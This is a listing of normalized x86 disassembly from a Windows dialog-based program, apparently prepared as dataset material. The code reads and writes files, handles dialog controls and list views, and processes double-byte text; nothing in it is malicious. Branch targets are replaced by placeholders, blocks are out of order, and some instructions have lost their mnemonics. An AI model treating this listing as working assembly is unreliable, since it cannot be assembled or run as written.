mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax [ esp + 0xc ]
xor ebx ebx
push eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x14 ] ebx
call sub_431a26
mov ecx [ esp + 0x14 ]
push ecx
mov [ esi + 0x18 ] eax
call sub_431a26
mov edx [ esp + 0x1c ]
mov cl 0x1
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] cl
mov [ esi + 0x21 ] bl
mov [ esi + 0x22 ] bl
mov [ esi + 0x23 ] bl
mov [ esi + 0x24 ] bl
mov [ esi + 0x25 ] bl
mov [ esi + 0x26 ] bl
mov [ esi + 0x27 ] bl
mov al [ edx ]
add esp 0x8
cmp al bl
je r-xdata
pop esi
pop ebx
retn 0xc
movsx eax al
sub eax 0x42
inc edx
cmp eax 0x33
ja r-xdata
mov al [ edx ]
cmp al bl
jne r-xdata
movzx eax [ eax + lookup_table_404bd0 ]
jmp [ eax * 4 + jump_table_404b9c ]
mov [ esi + 0x20 ] cl
jmp r-xdata
mov [ esi + 0x20 ] 0x2
jmp r-xdata
mov [ esi + 0x20 ] 0x3
jmp r-xdata
mov [ esi + 0x21 ] cl
jmp r-xdata
mov [ esi + 0x22 ] cl
jmp r-xdata
mov [ esi + 0x22 ] 0x2
jmp r-xdata
mov [ esi + 0x23 ] cl
jmp r-xdata
mov [ esi + 0x23 ] 0x2
jmp r-xdata
mov [ esi + 0x25 ] cl
jmp r-xdata
mov [ esi + 0x24 ] cl
jmp r-xdata
mov [ esi + 0x26 ] cl
jmp r-xdata
mov [ esi + 0x27 ] cl
sub_404c10
sub esp 0x200
push esi
mov esi ecx
mov al [ esi + 0x21 ]
test al al
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
cmp [ esi + 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
pop esi
add esp 0x200
retn
mov ecx esi
call sub_404ac0
call sub_404550
xor ecx ecx
test eax eax
setne cl
mov [ esi + 0x14 ] eax
pop esi
dec ecx
and ecx 0xf5
mov eax ecx
add esp 0x200
retn
push edi
call sub_404ac0
lea ecx [ esp + 0x8 ]
mov edi eax
call sub_404500
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push edi
mov edi [ CreateFileA@IAT ]
call edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
mov [ esi + 0x8 ] eax
push 0x80000000
lea eax [ esp + 0x20 ]
push eax
call edi
cmp [ esi + 0x8 ] 0xffffffff
mov [ esi + 0xc ] eax
pop edi
je r-xdata
mov eax 0xf8
pop esi
add esp 0x200
retn
cmp eax 0xffffffff
je r-xdata
push 0x0
push eax
call [ GetFileSize@IAT ]
shr eax 0x2
dec eax
mov [ esi + 0x10 ] eax
sub_404ce0
push ecx
push ebx
push ebp
push esi
push edi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
call sub_404ac0
push eax
call [ CreateFileA@IAT ]
mov edx [ esp + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ecx edx
mov ebp ecx
shr ecx 0x2
mov esi eax
xor eax eax
mov edi ebx
[ edi ]
mov ecx ebp
and ecx 0x3
cmp esi 0xffffffff
[ edi ]
jne r-xdata
push 0x0
lea eax [ esp + 0x14 ]
push eax
push edx
push ebx
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x8
sub_404d60
sub esp 0x18
push ebx
push ebp
push esi
mov esi ecx
movzx ecx [ esi + 0x20 ]
dec ecx
push edi
lea eax [ esp + 0x14 ]
je r-xdata
mov [ esp + 0x14 ] 0x45
dec ecx
je r-xdata
mov [ eax ] 0x4e
dec ecx
jne r-xdata
mov [ esp + 0x14 ] 0x55
jmp r-xdata
dec ecx
jne r-xdata
mov [ eax ] 0x63
dec ecx
jne r-xdata
movzx ecx [ esi + 0x23 ]
dec ecx
je r-xdata
mov [ eax ] 0x4f
jmp r-xdata
lea eax [ esp + 0x15 ]
movzx ecx [ esi + 0x22 ]
dec ecx
je r-xdata
mov [ esp + 0x14 ] 0x4d
jmp r-xdata
mov cl [ esi + 0x25 ]
test cl cl
je r-xdata
mov [ eax ] 0x49
inc eax
mov cl [ esi + 0x21 ]
test cl cl
je r-xdata
mov [ eax ] 0x75
jmp r-xdata
inc eax
mov cl [ esi + 0x24 ]
test cl cl
je r-xdata
mov [ eax ] 0x42
inc eax
inc eax
mov cl [ esi + 0x26 ]
test cl cl
je r-xdata
mov [ eax ] 0x53
inc eax
mov cl [ esi + 0x27 ]
test cl cl
je r-xdata
mov [ eax ] 0x4b
inc eax
mov edi [ lstrlenA@IAT ]
mov [ eax ] 0x0
push 0x0
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call edi
mov ebx [ esp + 0x34 ]
mov ebp [ WriteFile@IAT ]
inc eax
push eax
lea edx [ esp + 0x20 ]
push edx
push ebx
call ebp
mov ecx [ esi + 0x18 ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ecx
call edi
mov edx [ esi + 0x18 ]
inc eax
push eax
push edx
push ebx
call ebp
mov ecx [ esi + 0x1c ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ecx
call edi
mov edx [ esi + 0x1c ]
inc eax
push eax
push edx
push ebx
call ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn 0x4
mov [ eax ] 0x51
inc eax
sub_404e50
mov eax [ esp + 0x8 ]
sub esp 0x208
sub eax 0x53
push ebx
push ebp
push esi
push edi
mov esi ecx
je r-xdata
mov ecx [ esp + 0x21c ]
push 0x706
push ecx
call sub_414bc0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn 0x10
sub eax 0xbd
je r-xdata
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
mov eax [ rw-data ]
mov esi [ SendDlgItemMessageA@IAT ]
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0x409
push 0x438
push eax
call esi
mov edx [ esp + 0x10 ]
xor ecx ecx
test eax eax
jle r-xdata
lea eax [ esi + 0x224 ]
xor edi edi
cmp [ eax ] 0x9
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn 0x10
movzx eax [ esp + 0x224 ]
dec eax
je r-xdata
push edx
xor edx edx
cmp ecx eax
setne dl
push eax
mov eax [ esp + 0x224 ]
push 0x408
add edx 0x41a
push edx
push eax
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn 0x10
lea esp [ esp ]
mov cx [ esi + edi * 2 + 0x226 ]
inc edi
cmp cx 0x215a
je r-xdata
mov ecx eax
mov ebp [ esp + 0x21c ]
mov ebx [ SendDlgItemMessageA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x409
push 0x41a
push ebp
call ebx
lea edx [ esp + 0x14 ]
push edx
push 0x0
push 0x409
push 0x41b
push ebp
mov edi eax
call ebx
xor ebp ebp
xor edx edx
test edi edi
mov ebx eax
jle r-xdata
dec eax
je r-xdata
inc ecx
cmp ecx eax
jl r-xdata
mov ecx [ esp + 0x21c ]
mov ebp [ SendDlgItemMessageA@IAT ]
push eax
lea eax [ edi - 0x1 ]
push eax
push 0x408
push 0x41b
push ecx
call ebp
inc edi
lea eax [ esi + edi * 2 + 0x224 ]
xor ebx ebx
cmp [ eax ] 0x9
je r-xdata
cmp cx 0x5b
je r-xdata
add ecx 0x2
inc edi
cmp [ ecx ] 0x9
jne r-xdata
je r-xdata
jmp r-xdata
mov eax [ esp + 0x21c ]
push 0x0
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn 0x10
sub eax 0x3e5
je r-xdata
cmp [ edx + ecx * 2 ] 0x3000
jae r-xdata
push eax
mov eax [ esp + 0x220 ]
lea edx [ ebx - 0x1 ]
push edx
push 0x408
push 0x41a
push eax
call ebp
lea edi [ edi + ebx + 0x1 ]
mov ecx eax
mov edx [ esp + 0x21c ]
push eax
lea ecx [ edi - 0x1 ]
push ecx
push 0x408
push 0x41a
push edx
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
mov esi [ esp + 0x21c ]
push 0x10
push 0xe6
push 0xe7
push esi
call sub_420e20
add esp 0x10
push 0x41a
push esi
jmp r-xdata
cmp edx edi
jne r-xdata
mov eax [ esp + 0x10 ]
movzx eax [ eax + edx * 2 ]
cmp ax 0x20
je r-xdata
mov ecx [ esp + 0x21c ]
mov [ esp + eax + 0x18 ] 0x0
lea eax [ esp + 0x18 ]
push eax
push 0x41c
push ecx
call [ SetDlgItemTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn 0x10
lea ecx [ esi + edi * 2 + 0x224 ]
mov esi [ esi + 0x218 ]
sub esi edi
add ecx 0x2
inc ebx
cmp [ ecx ] 0x9
jne r-xdata
mov ecx [ esi + 0x218 ]
xor eax eax
cmp edi ecx
jge r-xdata
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn 0x10
test ebp ebp
mov ebp [ esp + 0x21c ]
je r-xdata
test edi edi
mov ecx eax
and ecx 0x7f00
cmp cx 0x2400
je r-xdata
mov dl [ ecx ]
mov [ esp + eax + 0x18 ] dl
inc eax
add ecx 0x2
dec esi
jne r-xdata
xor eax eax
cmp ebx eax
mov [ esi + 0x218 ] eax
jne r-xdata
push 0x34
push 0xe6
push 0xe8
push ebp
call sub_420e20
add esp 0x10
cmp eax 0x7
jne r-xdata
inc edx
cmp edx edi
jl r-xdata
cmp cx 0x2500
je r-xdata
jle r-xdata
cmp edi eax
jle r-xdata
push 0x41a
jmp r-xdata
cmp ax 0x213c
je r-xdata
mov eax [ esi + 0x218 ]
mov [ esi + eax * 2 + 0x224 ] 0x9
mov ebx [ esi + 0x218 ]
inc ebx
mov [ esi + 0x218 ] ebx
mov cl [ rw-data ]
neg cl
mov eax ebx
sbb ecx ecx
and ecx 0xffffdf01
add ecx 0x215a
mov [ esi + eax * 2 + 0x224 ] cx
mov ebx [ esi + 0x218 ]
inc ebx
xor eax eax
test edi edi
mov [ esi + 0x218 ] ebx
mov ecx ebx
jle r-xdata
nop
mov ecx [ esi + 0x218 ]
mov [ esi + ecx * 2 + 0x224 ] 0x9
mov edx [ esi + 0x218 ]
inc edx
mov [ esi + 0x218 ] edx
mov cl [ rw-data ]
mov eax edx
xor edx edx
test cl cl
setne dl
push 0x200
dec edx
and eax edx
mov [ esi + 0x21c ] ax
lea eax [ esp + 0x1c ]
push eax
push 0x41c
push ebp
call [ GetDlgItemTextA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
call [ lstrlenA@IAT ]
test eax eax
jne r-xdata
lea ecx [ ecx ]
push ebp
cmp ax 0x2141
je r-xdata
mov al [ rw-data ]
neg al
sbb eax eax
and eax 0xffffdf02
add eax 0x215b
mov [ esi + ecx * 2 + 0x224 ] ax
inc [ esi + 0x218 ]
lea ebx [ ebx ]
mov edx [ esp + 0x14 ]
mov ecx [ esi + 0x218 ]
mov dx [ edx + eax * 2 ]
mov [ esi + ecx * 2 + 0x224 ] dx
mov ecx [ esi + 0x218 ]
inc ecx
inc eax
cmp eax ebx
mov [ esi + 0x218 ] ecx
jl r-xdata
mov al [ esp + 0x18 ]
test al al
lea ecx [ esp + 0x18 ]
je r-xdata
push 0x30
push 0xe6
push 0xe9
push ebp
call sub_420e20
add esp 0x10
push 0x41c
mov edx [ esp + 0x10 ]
mov dx [ edx + eax * 2 ]
mov ecx [ esi + 0x218 ]
mov [ esi + ecx * 2 + 0x224 ] dx
mov ebx [ esi + 0x218 ]
inc ebx
inc eax
cmp eax edi
mov [ esi + 0x218 ] ebx
jl r-xdata
jmp r-xdata
mov ebp 0x1
mov edx [ esp + 0x10 ]
mov dx [ edx + eax * 2 ]
mov [ esi + ecx * 2 + 0x224 ] dx
mov ecx [ esi + 0x218 ]
inc ecx
inc eax
cmp eax edi
mov [ esi + 0x218 ] ecx
jl r-xdata
push 0x1
push ebp
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn 0x10
movzx dx al
mov eax [ esi + 0x218 ]
mov [ esi + eax * 2 + 0x224 ] dx
mov ebx [ esi + 0x218 ]
mov al [ ecx + 0x1 ]
inc ebx
inc ecx
test al al
mov [ esi + 0x218 ] ebx
jne r-xdata
sub_405330
sub esp 0x8
push ebx
push ebp
mov ebp ecx
call sub_40aad0
push eax
push 0x1
call sub_429969
mov ebx eax
add esp 0x8
test ebx ebx
mov [ esp + 0xc ] ebx
jne r-xdata
mov [ ebx ] 0xa
mov ecx [ ebp + 0xc ]
cmp [ ecx ] 0x0
push esi
mov [ esp + 0xc ] 0x0
lea esi [ ebx + 0x1 ]
jle r-xdata
mov eax [ ebp + 0x214 ]
push eax
call sub_420ef0
add esp 0x4
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
pop esi
pop ebp
mov eax ebx
pop ebx
add esp 0x8
retn
push edi
mov [ esi ] 0x20
mov cx [ ebp + eax * 2 + 0x226 ]
inc esi
inc eax
cmp cx 0x215a
je r-xdata
mov ecx edi
lea ecx [ ecx ]
mov [ esi ] 0x5b
inc esi
inc eax
mov cx [ ebp + eax * 2 + 0x224 ]
cmp cx 0x215b
lea edi [ ebp + eax * 2 + 0x224 ]
je r-xdata
cmp cx 0x5b
jne r-xdata
mov dl dh
or dl 0x80
mov [ esi ] dl
mov dl [ edi ]
or dl 0x80
inc esi
mov [ esi ] dl
add ecx 0x2
xor edx edx
mov dx [ ecx ]
inc esi
inc eax
cmp dx 0x9
mov edi ecx
jne r-xdata
mov ebx [ esp + 0x14 ]
mov [ esi ] 0x5d
inc esi
mov [ esi ] 0x20
inc esi
add eax 0x2
mov edx edi
lea esp [ esp ]
mov [ esi ] 0x2f
mov ecx [ ebp + 0x218 ]
inc esi
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x10 ]
mov [ esi ] 0x2f
inc esi
mov [ esi ] 0xa
mov ecx [ ebp + 0xc ]
push eax
inc esi
call sub_40a490
mov ecx [ ebp + 0xc ]
cmp eax [ ecx ]
mov [ esp + 0x10 ] eax
jl r-xdata
lea ecx [ ebp + eax * 2 + 0x224 ]
jmp r-xdata
mov cl ch
or cl 0x80
mov [ esi ] cl
mov cl [ edi ]
or cl 0x80
inc esi
mov [ esi ] cl
add edx 0x2
xor ecx ecx
mov cx [ edx ]
inc esi
inc eax
cmp cx 0x215b
mov edi edx
jne r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
lea edi [ ebp + 0x224 ]
push edi
call sub_40aea0
mov [ ebp + 0x218 ] eax
xor edx edx
mov dx [ edi ]
xor eax eax
cmp dx 0x9
je r-xdata
pop edi
mov dl [ ecx ]
mov [ esi ] dl
mov edx [ ebp + 0x218 ]
inc esi
inc eax
add ecx 0x2
cmp eax edx
jl r-xdata
cmp cx 0x5d
je r-xdata
sub_4054b0
mov eax [ esp + 0x4 ]
push edi
mov edi ecx
cmp [ eax ] 0xa
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
pop edi
retn 0x8
push esi
xor esi esi
lea esi [ edi + 0x4 ]
jmp r-xdata
test edi edi
je r-xdata
pop esi
push 0x3
push 0x1
call sub_4043a0
mov cl [ eax ]
add esp 0x8
test cl cl
jne r-xdata
sub_4054f0
push ecx
push esi
mov esi ecx
mov ecx [ esi + 0x210 ]
push edi
call sub_4049b0
mov ecx [ rw-data ]
call sub_405330
mov ecx [ esi + 0x210 ]
push 0x1
mov [ ecx + 0x14 ] eax
mov ecx [ esi + 0x210 ]
push 0x3
call sub_404ac0
push eax
mov ecx rw-data
call sub_425b30
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0x210 ]
mov eax [ eax + 0x14 ]
lea ecx [ eax + 0x1 ]
mov eax ecx
lea esi [ eax + 0x1 ]
mov al [ rw-data ]
test al al
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
push edx
sub eax esi
push eax
push ecx
push edi
call [ WriteFile@IAT ]
push edi
call [ CloseHandle@IAT ]
pop edi
xor eax eax
pop esi
pop ecx
retn
mov ecx [ esi + 0x210 ]
call sub_404ac0
mov edx [ rw-data ]
push eax
push 0xeb
push edx
call sub_409fd0
add esp 0xc
pop edi
mov eax 0x1
pop esi
pop ecx
retn
sub_4055a0
push ebx
push esi
push 0x0
push 0x1
push r--data
mov ecx rw-data
call sub_425ab0
mov ebx [ lstrlenA@IAT ]
mov esi eax
push esi
call ebx
push eax
push esi
push edi
call sub_431a51
add esp 0xc
test eax eax
je r-xdata
push esi
call ebx
pop esi
add eax edi
pop ebx
retn
pop esi
mov eax edi
pop ebx
retn
sub_4055e0
push ebx
mov ebx [ SendMessageA@IAT ]
push ebp
push esi
push 0x0
push 0x0
push 0x1004
push edi
call ebx
mov ebp eax
xor esi esi
test ebp ebp
jle r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
retn
lea ecx [ ecx ]
mov eax esi
pop esi
pop ebp
pop ebx
retn
inc esi
cmp esi ebp
jl r-xdata
push 0x2
push esi
push 0x102c
push edi
call ebx
test eax eax
jne r-xdata
sub_405620
sub esp 0x28
push ebx
push ebp
mov ebp [ esp + 0x34 ]
push esi
push eax
mov esi ecx
call sub_420ca0
add esp 0x4
test esi esi
mov ebx eax
jne r-xdata
mov ecx [ esp + 0x3c ]
lea eax [ esp + 0x14 ]
push eax
push ecx
push 0x101b
push ebp
mov [ esp + 0x24 ] 0x6
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] ebx
call [ SendMessageA@IAT ]
pop esi
pop ebp
pop ebx
add esp 0x28
retn
push edi
push ebp
call [ GetDC@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
mov edi eax
call [ lstrlenA@IAT ]
push eax
push ebx
push edi
call [ GetTextExtentPoint32A@IAT ]
mov esi [ esp + 0x10 ]
lea edx [ esp + 0x10 ]
push edx
push 0x2
push r--data
push edi
call [ GetTextExtentPoint32A@IAT ]
mov edx [ esp + 0x10 ]
push edi
push ebp
add esi edx
call [ ReleaseDC@IAT ]
pop edi
sub_4056b0
push esi
mov esi ecx
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov [ esi + 0x210 ] ecx
call sub_4049b0
mov ecx [ esi + 0x210 ]
pop esi
jmp sub_404c10
mov al 0x2
nop
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne r-xdata
cmp [ ecx + 0x23 ] al
je r-xdata
sub_4056f0
sub esp 0x1c
push ebp
push esi
mov esi [ PeekMessageA@IAT ]
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x18 ]
push eax
mov ebp ecx
call esi
test eax eax
je r-xdata
mov cl [ ebp + 0x234 ]
xor eax eax
cmp cl 0x2
pop esi
sete al
pop ebp
add esp 0x1c
retn
push ebx
mov ebx [ DispatchMessageA@IAT ]
push edi
mov edi [ TranslateMessage@IAT ]
mov edi edi
lea ecx [ esp + 0x10 ]
push ecx
call edi
lea edx [ esp + 0x10 ]
push edx
call ebx
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call esi
test eax eax
jne r-xdata
pop edi
pop ebx
sub_405760
mov al [ rw-data ]
test al al
push esi
mov esi ecx
je r-xdata
pop esi
retn 0x4
mov eax [ esp + 0x8 ]
cmp [ eax ] 0xa
je r-xdata
cmp [ eax - 0x4 ] 0x28
jne r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0xa
jne r-xdata
cmp [ eax - 0x3 ] 0x50
jne r-xdata
cmp [ eax - 0x2 ] 0x29
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx ]
dec eax
push eax
call sub_40ac60
mov ecx [ esi + 0x230 ]
cmp eax ecx
je r-xdata
mov ecx [ esi + 0x230 ]
push ecx
mov ecx [ esi + 0x8 ]
call sub_40a490
mov ecx [ esi + 0x8 ]
push 0x0
push 0x0
mov [ esi + 0x230 ] eax
call sub_40b050
push ecx
mov ecx [ esi + 0x8 ]
push eax
call sub_40b1e0
sub_4057e0
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
sub esp 0x200
push 0x100
lea eax [ esp + 0x4 ]
push eax
push ecx
push edx
call [ LoadStringA@IAT ]
lea eax [ esp + 0x20c ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x108 ]
push edx
call [ wvsprintfA@IAT ]
push 0x30
push 0xec
call sub_420ca0
mov ecx [ esp + 0x20c ]
mov edx [ ecx + 0x220 ]
add esp 0x4
push eax
lea eax [ esp + 0x108 ]
push eax
push edx
call [ MessageBoxA@IAT ]
add esp 0x200
retn
sub_405850
push esi
push edi
mov edi [ IsDlgButtonChecked@IAT ]
mov esi ecx
mov eax [ esi + 0x220 ]
push 0x43b
push eax
call edi
mov [ rw-data ] al
mov ecx [ esi + 0x220 ]
push 0x43a
push ecx
call edi
mov [ rw-data ] al
mov edx [ esi + 0x220 ]
push 0x43d
push edx
call edi
mov [ rw-data ] al
mov eax [ esi + 0x220 ]
push 0x444
push eax
call edi
mov [ rw-data ] al
mov ecx [ esi + 0x220 ]
push 0x445
push ecx
call edi
mov [ rw-data ] al
mov edx [ esi + 0x220 ]
push 0x446
push edx
call edi
mov [ rw-data ] al
mov eax [ esi + 0x220 ]
push 0x447
push eax
call edi
mov [ rw-data ] al
mov ecx [ esi + 0x220 ]
push 0x44c
push ecx
call edi
mov [ rw-data ] al
mov edx [ esi + 0x220 ]
push 0x448
push edx
call edi
mov [ rw-data ] al
mov eax [ esi + 0x220 ]
push 0x449
push eax
call edi
mov [ rw-data ] al
mov ecx [ esi + 0x220 ]
push 0x44a
push ecx
call edi
mov [ rw-data ] al
mov edx [ esi + 0x220 ]
push 0x44b
push edx
call edi
pop edi
mov [ rw-data ] al
pop esi
retn
sub_4059a0
mov eax [ esp + 0x8 ]
sub esp 0x100
test eax eax
push esi
mov esi [ esp + 0x108 ]
lea edx [ esp + 0x4 ]
je r-xdata
mov eax [ esi + 0x22c ]
mov ecx [ esi + 0x228 ]
push eax
neg eax
sbb eax eax
push ecx
add eax 0xf7
push eax
push edx
call sub_420b10
add esp 0x10
lea ecx [ esp + 0x110 ]
push ecx
push eax
push edx
call [ wvsprintfA@IAT ]
jmp r-xdata
mov ecx [ esi + 0x220 ]
lea eax [ esp + 0x4 ]
push eax
push 0x441
push ecx
call [ SetDlgItemTextA@IAT ]
pop esi
add esp 0x100
retn
sub_405a10
mov eax [ ecx + 0x250 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x244 ]
lea ecx [ ecx + eax * 2 - 0x2 ]
mov ax [ ecx ]
cmp ax 0x2a
je r-xdata
mov eax [ ecx + 0x248 ]
mov ecx [ ecx + 0x23c ]
mov dx [ esp + 0x4 ]
mov [ ecx + eax * 2 - 0x2 ] dx
xor eax eax
retn 0x4
mov eax 0x1
retn 0x4
cmp ax 0x3f
je r-xdata
cmp ax 0x5b
je r-xdata
cmp ax 0x5d
je r-xdata
mov dx [ esp + 0x4 ]
mov [ ecx ] dx
xor eax eax
retn 0x4
sub_405a70
mov al [ rw-data ]
push esi
push edi
test al al
mov al [ rw-data ]
mov edi ecx
je r-xdata
test al al
jne r-xdata
test al al
je r-xdata
mov eax 0x2
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov esi [ CheckDlgButton@IAT ]
push eax
mov eax [ edi + 0x220 ]
push 0x43c
push eax
call esi
movzx ecx [ rw-data ]
mov edx [ edi + 0x220 ]
push ecx
push 0x43a
push edx
call esi
movzx eax [ rw-data ]
mov ecx [ edi + 0x220 ]
push eax
push 0x43b
push ecx
call esi
movzx edx [ rw-data ]
mov eax [ edi + 0x220 ]
push edx
push 0x43d
push eax
call esi
movzx ecx [ rw-data ]
mov edx [ edi + 0x220 ]
push ecx
push 0x444
push edx
call esi
movzx eax [ rw-data ]
mov ecx [ edi + 0x220 ]
push eax
push 0x445
push ecx
call esi
movzx edx [ rw-data ]
mov eax [ edi + 0x220 ]
push edx
push 0x446
push eax
call esi
movzx ecx [ rw-data ]
mov edx [ edi + 0x220 ]
push ecx
push 0x447
push edx
call esi
movzx eax [ rw-data ]
mov ecx [ edi + 0x220 ]
push eax
push 0x44c
push ecx
call esi
movzx edx [ rw-data ]
mov eax [ edi + 0x220 ]
push edx
push 0x448
push eax
call esi
movzx ecx [ rw-data ]
mov edx [ edi + 0x220 ]
push ecx
push 0x449
push edx
call esi
movzx eax [ rw-data ]
mov ecx [ edi + 0x220 ]
push eax
push 0x44a
push ecx
call esi
movzx edx [ rw-data ]
mov eax [ edi + 0x220 ]
push edx
push 0x44b
push eax
call esi
pop edi
pop esi
retn
sub_405bc0
mov al [ ecx + 0x23b ]
test al al
mov al [ rw-data ]
push esi
je r-xdata
test al al
je r-xdata
test al al
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov al [ eax ]
cmp al 0x5b
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov esi [ esp + 0x8 ]
mov al [ esi ]
cmp al 0x2f
je r-xdata
xor eax eax
pop esi
retn 0x8
mov eax [ esp + 0xc ]
mov dl [ eax ]
cmp dl 0x5d
je r-xdata
cmp al 0xa
je r-xdata
mov ecx [ esp + 0xc ]
mov al [ ecx ]
cmp al 0x2f
je r-xdata
mov cl [ rw-data ]
test cl cl
jne r-xdata
cmp dl 0x20
je r-xdata
cmp al 0xd
je r-xdata
mov cl [ rw-data ]
test cl cl
jne r-xdata
cmp [ esi ] 0x20
jne r-xdata
movzx eax al
push eax
call sub_429ce2
add esp 0x4
test eax eax
je r-xdata
push ebx
mov bl [ ecx + 0x238 ]
test bl bl
pop ebx
je r-xdata
mov al [ ecx + 0x238 ]
test al al
je r-xdata
mov eax 0x1
pop esi
retn 0x8
movzx edx al
push edx
call sub_429ce2
add esp 0x4
test eax eax
jne r-xdata
cmp [ esi - 0x1 ] 0x29
jne r-xdata
cmp dl 0x29
je r-xdata
mov al [ eax + 0x1 ]
xor ecx ecx
cmp dl 0xa1
sete cl
xor edx edx
cmp al 0xa2
sete dl
test ecx edx
jne r-xdata
xor edx edx
cmp al 0xbf
sete dl
test ecx edx
jne r-xdata
sub_405cc0
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x44 ] 0x1
mov eax [ eax + 0x8 ]
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x50 ]
lea ecx [ esi + 0x30 ]
mov [ esi + 0x24 ] 0x0
mov [ ecx ] eax
mov edx [ eax + 0x8 ]
mov [ esi + 0x34 ] edx
mov ax [ eax + 0x18 ]
mov [ esi + 0x38 ] ax
call sub_40db00
push 0x0
mov ecx esi
call sub_401e50
mov eax 0x1
pop esi
retn
sub_405d10
push ebp
mov ebp [ esp + 0x8 ]
push esi
xor esi esi
test ebp ebp
push edi
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
mov edi eax
nop
movzx eax al
push eax
call sub_429b24
add esp 0x4
mov ecx eax
test [ ebx + esi * 2 + 0x1 ] 0x7f
je r-xdata
movzx eax [ ebx + esi * 2 ]
pop edi
movzx ecx cx
pop esi
sub eax ecx
pop ebp
retn
inc esi
inc edi
cmp esi ebp
jl r-xdata
movzx ax al
cmp ax 0xa5
jne r-xdata
mov al [ edi ]
test al al
jns r-xdata
xor ecx ecx
mov ch al
inc edi
mov cl [ edi ]
and ecx 0x7f7f
jmp r-xdata
mov eax 0xa4
cmp cx [ ebx + esi * 2 ]
jne r-xdata
sub_405d80
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
lea eax [ esp + 0x10 ]
push eax
mov ecx edi
call sub_4045c0
mov ebp [ esp + 0x24 ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx ebp
mov esi eax
call sub_4045c0
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
add esp 0x8
cmp esi ecx
je r-xdata
cmp eax edx
je r-xdata
cmp eax edx
je r-xdata
cmp esi ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
cmp esi ecx
je r-xdata
mov bl [ eax ]
xor bl [ esi ]
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
mov ecx edi
call sub_4045c0
lea edx [ esp + 0x18 ]
push edx
mov ecx ebp
mov esi eax
call sub_4045c0
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
add esp 0x8
cmp esi ecx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
cmp eax edx
je r-xdata
add esi 0x2
add eax 0x2
cmp esi ecx
jne r-xdata
cmp eax edx
jne r-xdata
lea ecx [ ecx ]
xor edx edx
mov dl [ eax ]
xor eax eax
mov al [ esi ]
pop edi
pop esi
pop ebp
pop ebx
and edx 0xff
and eax 0xff
cmp edx eax
sbb eax eax
neg eax
add esp 0x8
retn
mov cx [ eax ]
cmp cx [ esi ]
pop edi
pop esi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x8
retn
mov ax [ edi ]
test ax ax
je r-xdata
cmp esi ecx
jne r-xdata
mov bx [ esi ]
cmp bx [ eax ]
jne r-xdata
xor eax eax
mov ax [ ebp ]
